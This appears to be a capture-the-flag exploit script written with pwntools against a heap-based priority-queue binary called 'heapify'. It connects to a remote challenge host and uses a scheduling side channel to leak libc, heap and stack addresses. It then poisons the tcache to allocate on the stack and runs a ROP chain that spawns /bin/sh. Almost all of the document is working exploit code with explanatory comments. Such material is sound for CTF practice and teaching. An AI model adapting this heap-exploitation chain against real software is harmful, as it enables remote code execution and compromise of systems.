#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapify_patched")
libc = exe.libc

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("154.57.164.73", 32599)

    return r


def add_cmd(size: int, priority: int, data: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(size).encode())
    r.sendlineafter(b": ", str(priority).encode())
    r.sendlineafter(b": ", data)


def add_cmd_preserve_priority(size: int, data: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(size).encode())

    # scanf for the priority field will fail on 'x'.
    # getchar() will consume 'x' and the rest will be fed to fgets()
    r.sendlineafter(b": ", b"x" + data)


def exec_cmd() -> bytes:
    r.sendlineafter(b"> ", b"2")
    return r.recvlines(2)[-1].strip()


def leak_libc():
    # Fill tcache and add enough chunks inside fastbin.
    # Make sure the chunks are placed in sequential order
    # inside the real heap
    for idx in range(0x20):
        add_cmd(0x68, 0x20-idx, b"A" * 0x18)

    for idx in range(0x20):
        exec_cmd()

    # Now send a large input to `scanf`, which will handle it
    # by allocating a chunk from the heap.
    # Large requests will trigger `malloc_consolidate` and 
    # consolidate fast chunks to accomodate the request.
    # This will then place the new chunk inside the unsortedbin
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", b"1" * 0xff8)    # This should give us enough room to
                                            # have enough remainders and leak libc

    # Allocate from tcache so next allocations will come from
    # the remaindering process
    for _ in range(0x7):
        add_cmd(0x68, -1, b"A" * 0x18)

    # Add a known comparison value.
    # We can avoid making useless comparisons knowing that
    # libc is always above 0x700000000000
    add_cmd(0x10, 0x700000000000, b"id")

    leak = 0x0
    byte = 0x70

    # Now we proceed with a simple sequential bruteforce
    for idx in range(5, -1, -1):
        add_cmd_preserve_priority(0x10 + 0x10 * idx, b"ratio")

        while byte < 0xFF:
            out = exec_cmd()

            if b"uid=" in out:
                byte += 1
                guess = leak | (byte << (8 * idx))
                add_cmd(0x10, guess, b"id")

            else:

                exec_cmd()  # Remove the oracle chunk and
                            # replace it with the new value

                leak = leak | ((byte - 1) << (8 * idx))
                add_cmd(0x10, leak, b"id")
                break

        byte = 0x00

    # NOTE: The last byte will be at -1 the correct value
    return leak + 1


# The idea is similar to the one used to leak libc, but
# because we can easily "restore" the next_ptr of a chunk
# without too much headache, we can adopt a much faster
# approach: the binary search
def leak_heap():
    MIN = 0x500000000000 >> 12
    MAX = 0x6FFFFFFFFFFF >> 12

    add_cmd(0x10, 8, b"A" * 0x8)
    exec_cmd()

    add_cmd_preserve_priority(0x10, b"ratio")

    # Add a known comparison value
    add_cmd(0x10, MIN, b"id")

    while MAX - MIN > 1:
        out = exec_cmd()

        if b"uid=" in out:
            MIN = ((MAX + MIN) // 2)
            add_cmd(0x10, MIN, b"id")
            
        else:
            exec_cmd()  # Remove the oracle chunk and
                        # replace it with the new value

            MAX = MIN
            MIN = ((MAX + (0x500000000000 >> 12)) // 2)
            add_cmd(0x10, MIN, b"id")

            # Re-insert the target chunk
            add_cmd_preserve_priority(0x10, b"ratio")

    return MAX


def leak_stack():
    MIN = 0x7FF000000000
    MAX = 0x7FFFFFFFFFFF

    # Place the chunk on the bin and have its next_ptr
    # take the value of our target stack address
    exec_cmd()

    add_cmd_preserve_priority(0x50, b"ratio")

    # Add a known comparison value
    add_cmd(0x10, MIN, b"id")

    while MAX - MIN > 1:
        out = exec_cmd()

        if b"uid=" in out:
            MIN = ((MAX + MIN) // 2)
            add_cmd(0x10, MIN, b"id")
            
        else:
            exec_cmd()  # Remove the oracle chunk and
                        # replace it with the new value

            MAX = MIN
            MIN = ((MAX + 0x7FF000000000) // 2)
            add_cmd(0x10, MIN, b"id")

            # Re-insert the target chunk
            add_cmd_preserve_priority(0x50, b"ratio")

    assert MAX != 0x7FF000000000
    return MAX


# Lower priority values are executed first because the structure is a min-heap.
# Therefore, a command with a lower priority value is closer to the root,
# while a command with a higher priority value is executed later.
#
# If scanf() fails to parse the priority (e.g. by sending a non-numeric value),
# the priority field remains unchanged, while fgets() still reads the command
# data. This allows us to preserve the value stored at the beginning of a
# reallocated chunk without overwriting it with a new command.
#
# We can use this primitive to leak an address through the heap's execution
# order. By preserving the chunk's next_ptr and varying its priority, we can
# use the heap as a side channel to determine whether the chunk containing the
# preserved pointer is executed before or after a known command.
#
# For example, assume that:
#   - the lowest-priority command contains "id";
#   - the target chunk preserves a next_ptr and contains "ratio".
#
# We can repeatedly adjust the target chunk's priority and execute the minimum
# element. If "id" is executed, the target chunk is still behind it in the
# heap. If we instead "ratio" is executed, the target chunk has reached the root
# and was executed before the "id" command.
#
# By adjusting the target priority based on this oracle, we can perform a
# binary search over the possible value of next_ptr. The same technique can
# then be used to infer heap, libc, or stack addresses, depending on where the
# preserved pointer points.
#
# We use binary search for the heap and stack leaks because the corresponding
# addresses can be constrained to relatively small search spaces.
# 
# For the heap leak, we can easily recover the heap base by allocating and
# freeing a chunk, giving us a known heap-related address from which the heap
# base can be inferred (0x0 ^ heap >> 12). This makes it practical to search for
# the target address using the binary-search oracle.
# 
# The stack leak works similarly, but for a different reason. When a tcache
# entry is freed, its next_ptr is stored in the chunk even when the tcache
# count for that bin eventually reaches zero. Therefore, if we imprint a stack
# address into the next_ptr of a tcache entry, a subsequently freed chunk in
# the same bin can retain that value as its next_ptr. We can then use the same
# oracle to recover the stack address with a binary search.
# 
# The libc leak, however, is handled with a sequential search. Performing a
# binary search in that case would require either allocating larger chunks,
# which is not possible because the program limits allocations to 0x70 bytes,
# or maintaining a much larger number of chunks. The custom heap can hold at
# most 0x3E entries, making the latter approach impractical. Therefore, we
# recover the libc address byte by byte using a sequential search instead,
# using just 6 different sized chunks obtained from the remaindering process
# of an unsortedbin chunk.
def main():
    r = conn()

    libc.sym["pop_rdi"] = 0x2a3e5
    libc.sym["pop_rsi"] = 0x2be51
    libc.sym["pop_rdx_rbx"] = 0x90529
    libc.sym["pop_rax"] = 0x45eb0
    libc.sym["syscall"] = 0x91396

    libc.address = leak_libc() - 0x219ce0
    log.info(f"libc: {libc.address:#x}")

    heap = leak_heap() << 12
    log.info(f"heap: {heap:#x}")

    # Clear the custom heap
    for _ in range(10):
        exec_cmd()

    # Use an previously used chunk to prepare an overlapping fake chunk inside it.
    # We are going to create a fake chunk which partially overlaps the freed one after it
    add_cmd(0x60, 0x1, p64(0x0) * 7 + p64(0x0) + p64(0x51) + p64(0x0) + p64(0xFF))
    exec_cmd()

    # Prepare two fake entries for the custom heap.
    # These will be read out-of-bound and swapped with an address inside the custom heap
    add_cmd(0x10, heap + 0x520, p64(heap + 0x528))

    # We need to reach the OOB indexes 0x4d and 0x4e for, respectively, left and right children
    # NOTE: Not always the OOB address is swapped and may cause the stack assertion to fail.
    #       I still don't know why this happens even though the priority list should be correct.
    #       In case of failure, run the script until the assertion is correctly passed
    priorities = [
        32, 33, 1, 31, 19, 20, 13,
        12, 14, 22, 24, 26, 16, 10, 21,
        29, 27, 9, 11, 7, 0, 15, 25,
        5, 30, 17, 6, 2, 23, 4, 3,
        8, 28
    ]

    for priority in priorities:
        add_cmd(0x10, priority, b"A" * 8)

    # Clear again the custom heap.
    # This will also free our fake 0x50-sized chunk
    for _ in range(0x22):
        exec_cmd()

    # We are going to allocate 0x60-sized chunks and free them in the desired order:
    # first we want to place a chunk inside the 0x60-sized bin and then place the
    # other one in it. In this way we have a counter of 2 for the allocations and a
    # next_ptr to overwrite to whatever we want.
    add_cmd(0x50, 0x10, b"A" * 0x8)
    add_cmd(0x50, 0x0, b"B" * 0x8)

    exec_cmd()
    exec_cmd()

    target = (heap >> 12) ^ libc.sym.environ

    # Use the overlapping fake chunk to overwrite the 0x60-sized chunk's
    # next_ptr and make it point to our target, then clear the custom heap
    add_cmd(0x40, 0x10, p64(0x0) * 2 + p64(0x61) + p64(target))
    exec_cmd()

    # Now we have a chunk on the heap and a chunk on the libc's environ variable.
    # Since the tcache saves the next_ptr on the bin, independently if the counter
    # is greater than 0 or not, we will have now a stack address "imprinted" in
    # the tcachebin. For example [0x60][2]: A -> B -> Stack and after allocations
    # we have [0x60][0]: Stack (Usually would be A -> B -> NULL).
    # All we have to do now is to use the same approach to leak heap (or libc) and
    # leak the stack address imprinted in that tcache bin.
    # We have to keep in mind that we want to use the chunk located on the heap for
    # this process as the other one won't have a valid size and will throw a free()
    # error when we try to free it.
    add_cmd(0x50, 0, b"")
    add_cmd(0x50, -1, b"")  # Add a large priority so it won't be freed while leaking stack

    send_cmd_saved_rbp  = ((libc.sym.environ >> 12) ^ (heap >> 12) ^ leak_stack()) - 0x138
    send_cmd_saved_rbp &= -0x10     # Clear the first nibble just in case
    log.info(f"stack target: {send_cmd_saved_rbp:#x}")

    # Prepare another 0x60-sized chunk to raise the counter to 2 and use the overlapping
    # chunkt to overwrite the next_ptr to our stack target
    add_cmd(0x50, 0x0, b"A" * 8)

    # Clear the custom heap but not completely (we won't free the libc chunk)
    exec_cmd()
    exec_cmd()
    exec_cmd()

    # Overwrite next_ptr to our target
    target = (heap >> 12) ^ send_cmd_saved_rbp
    add_cmd(0x40, 0x0, p64(0x0) * 2 + p64(0x61) + p64(target))

    payload = flat(
        libc.sym["pop_rdi"],
        libc.search(b"/bin/sh\x00").__next__(),
        libc.sym["pop_rsi"],
        0x0,
        libc.sym["pop_rdx_rbx"],
        0x0,
        0x0,
        libc.sym["pop_rax"],
        0x3b,
        libc.sym["syscall"]
    )

    # Allocate on the stack and call `system("/bin/sh")` through a ROP chain
    add_cmd(0x50, 0x0, b"A" * 8)
    add_cmd(0x50, 0x0, payload)

    r.interactive("$ ")


if __name__ == "__main__":
    main()
